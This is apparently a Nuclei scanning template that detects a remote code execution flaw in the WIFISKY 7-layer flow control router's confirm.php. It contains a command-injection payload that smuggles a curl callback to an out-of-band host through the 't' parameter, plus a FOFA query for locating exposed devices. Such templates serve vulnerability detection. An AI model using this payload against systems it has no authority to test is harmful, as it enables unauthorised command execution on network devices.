id: wifisky7-rce

info:
  name: WIFISKY-7 layer flow control router confirm.php - Remote Code Execution
  author: pussycat0x
  severity: high
  description: |
    There is an RCE vulnerability in the confirm.php interface of WIFISKY-7 layer flow control router
  reference:
    - https://github.com/wy876/POC/blob/main/WIFISKY-7%E5%B1%82%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8confirm.php%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: title="WIFISKY 7层流控路由器"
  tags: wifisky,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/notice/confirm.php?t=;curl+http%3A%2F%2F{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
